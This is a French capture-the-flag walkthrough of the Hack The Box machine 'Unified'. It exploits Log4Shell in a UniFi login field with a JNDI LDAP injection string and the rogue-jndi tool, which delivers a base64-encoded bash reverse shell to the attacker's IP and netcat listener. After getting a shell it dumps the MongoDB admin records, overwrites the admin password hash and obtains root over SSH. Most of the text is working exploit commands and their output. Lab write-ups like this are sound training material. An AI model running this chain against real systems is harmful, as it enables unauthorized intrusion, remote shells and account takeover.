# Unified

Notes sur la machine Unified.

Cette machine est intéressante vu que Log4j a supris tout le monde, étant donné que c'est une faille qui est la depuis un bon moment et elle n'a été decouverte que recemment.  Elle a même permis de prendre conscience sur le fait qu'un seul developpeur à la charge d'un projet et qui fait ce code de façon benevole pouvait être à la base d'une faille de grosse ampleur.

## On teste la vulnerabilité

On se sert du champ remember avec le repeater de burpsuite pour y introduire un appel ldap, on est à l'écoute avec tcpdump

${jndi:ldap://10.10.14.19/whatever}

```bash
❯ tcpdump -i tun0 port 389 -v
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
03:18:20.530190 IP (tos 0x0, ttl 63, id 10956, offset 0, flags [DF], proto TCP (6), length 60)
    10.129.125.109.60474 > 10.10.14.19.ldap: Flags [S], cksum 0xf4e8 (correct), seq 339107591, win 64240, options [mss 1360,sackOK,TS val 2396506282 ecr 0,nop,wscale 7], length 0
03:18:20.530225 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
    10.10.14.19.ldap > 10.129.125.109.60474: Flags [R.], cksum 0xaec7 (correct), seq 0, ack 339107592, win 0, length 0
```

## On construit l'application java rogue-jndi avec maven

Ici j'ai eu un doute sur la version de java mais cela marche quand même avec la version 17 de Parrot. De toutes façons si tu desinstalles la 17 t'as plus le burpsuite.

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

Nous avons construit :  RogueJndi-1.1.jar

On va utiliser cette appli pour créer le payload !

Le payload va être un reverse shell sous cette forme : 

```bash
❯ echo 'bash -c bash -i >&/dev/tcp/10.10.14.19/8888 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTkvODg4OCAwPiYxCg==
```

Un reverse shell classique.

On va donc executer RogueJndi-1.1.jar et on va lui passer le payload dans le paramettre --command et on va mettre le --hostname avec nôtre tun0

```bash
❯ java -jar ./RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTkvODg4OCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.19"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.19:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.14.19:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.19:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.19:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.19:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.19:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.19:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.19:1389/o=groovy to artsploit.controllers.Groovy
Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
```

On va sur BurpSuite et on send dans le repeater avec : 

```bash
{"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.14.19:1389/o=tomcat}","strict":true}
```

## On est à l'écoute et on reçois la connection

```bash
❯ nc -lvp 8888
listening on [any] 8888 ...
10.129.125.109: inverse host lookup failed: Unknown host
connect to [10.10.14.19] from (UNKNOWN) [10.129.125.109] 50980
whoami
unifi
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ 
```

## On se connecte a mongo pour chercher le pass de l'admin

```bash
unifi@unified:/home/michael$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Une fois trouvé on va le remplacer par le notre

1. On cree le pass en sha-512

```bash
mkpasswd -m sha-512 Password1234
```

2. On le remplace 

```bash
unifi@unified:/home/michael$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$xpt560mkS9qyXcXx$pif2PENRfHM/5IKuw4qaSbebUCh1dO72I5wZnL4tntxWzJzT7n4bNCwqXD6lY68UMCX6vx.2zpweswuYdBAX6."}})'
<ntxWzJzT7n4bNCwqXD6lY68UMCX6vx.2zpweswuYdBAX6."}})'
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
unifi@unified:/home/michael$ 
```

Puis on peut se connecter sur l'interface du site ;)

user : administrator
pass : Password1234

Dans le site on trouve le mot de passe pour root pour une connection ssh !!!

On se connecte en ssh et la machine est finie. \o/

[Pwned](https://www.hackthebox.com/achievement/machine/944728/441) 

---

